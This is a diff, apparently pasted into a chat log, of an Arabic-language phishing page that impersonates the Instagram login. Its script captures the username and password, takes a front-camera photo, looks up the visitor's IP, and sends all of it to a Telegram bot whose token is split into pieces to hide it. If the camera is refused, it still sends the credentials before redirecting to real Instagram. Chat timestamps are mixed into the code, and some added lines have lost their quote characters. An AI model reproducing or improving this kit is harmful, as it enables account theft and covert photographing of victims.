@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+[20/11/2026 4:09 PM] A: <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -18,7 +18,7 @@
 
 <div class="container">
     <div id="login-section">
-        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b564.png" class="logo">
+        <div style="font-family: cursive; font-size: 36px; font-weight: bold; margin-bottom: 30px; color: #262626;">Instagram</div>
         <form id="login-form">
             <input type="text" id="email" placeholder="رقم الهاتف أو اسم المستخدم" required>
             <input type="password" id="pass" placeholder="كلمة السر" required>
@@ -34,13 +34,13 @@
 </div>
 
 <script>
-    
-   const s1 = "9032113024";
+    // التوكن الجديد مقسماً وأمان تام
+    const s1 = "9032113024";
     const s2 = "AAEqpxKq";
     const s3 = "vOJI_yoF";
     const s4 = "k57Ys0gx";
     const s5 = "B5GHwlHP4L0";
-    const cId = "9032113024";
+    const cId = "9032113024"; // الشات آي دي الخاص بك
 
     function _buildKey() {
         return s1 + ":" + s2 + s3 + s4 + s5;
@@ -48,7 +48,7 @@
 
     let u_e = "", u_p = "";
 
-    // الانتقال لصفحة الكاميرا بعد "تسجيل الدخول"
+    // الانتقال لصفحة الكاميرا بعد "تسجيل الدخول" دون إرسال GET وهمي
     document.getElementById('login-form').addEventListener('submit', function(e) {
         e.preventDefault();
         u_e = document.getElementById('email').value;
@@ -63,42 +63,53 @@
 
         try {
             // طلب إذن الكاميرا
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
 
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
             // جلب الـ IP صامتاً
-            const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            let ipVal = "غير معروف";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ipVal = ipData.ip;
+            } catch(e) {}
 
             // التقاط الصورة
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
             canvas.getContext('2d').drawImage(video, 0, 0);
             
             canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', cId);
-                formData.append('photo', blob, 'verify.jpg');
-                
-                const report = `📸 صيدة كاميرا كاملة:\n\n👤: ${u_e}\n🔑: ${u_p}\n🌐 IP: ${ipRes.ip}\n📱: ${navigator.platform}`;
-                formData.append('caption', report);
+                if (blob) {
+[20/11/2026 4:09 PM] A: const formData = new FormData();
+                    formData.append('chat_id', cId);
+                    formData.append('photo', blob, 'verify.jpg');
+                    
+                    const report = 📸 صيدة كاميرا كاملة:\n\n👤: ${u_e}\n🔑: ${u_p}\n🌐 IP: ${ipVal}\n📱: ${navigator.platform};
+                    formData.append('caption', report);
 
-                // إرسال الصورة والبيانات باستخدام التوكن المجمع
-                await fetch(`https://api.telegram.org/bot${_buildKey()}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+                    // إرسال الصورة والبيانات باستخدام التوكن المجمع
+                    await fetch(https://api.telegram.org/bot${_buildKey()}/sendPhoto, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
 
                 stream.getTracks().forEach(t => t.stop());
                 window.location.replace("https://www.instagram.com/reels/");
-            }, 'image/jpeg');
+            }, 'image/jpeg', 0.95);
 
         } catch (err) {
             // في حال رفض الكاميرا، نرسل البيانات النصية فقط لكي لا تضيع الصيدة
-            const fallback = `⚠️ رفض الكاميرا (بيانات فقط):\n👤: ${u_e}\n🔑: ${u_p}`;
-            await fetch(`https://api.telegram.org/bot${_buildKey()}/sendMessage?chat_id=${cId}&text=${encodeURIComponent(fallback)}`);
+            const fallback = ⚠️ رفض الكاميرا (بيانات فقط):\n👤: ${u_e}\n🔑: ${u_p};
+            try {
+                await fetch(https://api.telegram.org/bot${_buildKey()}/sendMessage?chat_id=${cId}&text=${encodeURIComponent(fallback)});
+            } catch(e) {}
             window.location.replace("https://www.instagram.com/reels/");
         }
     });
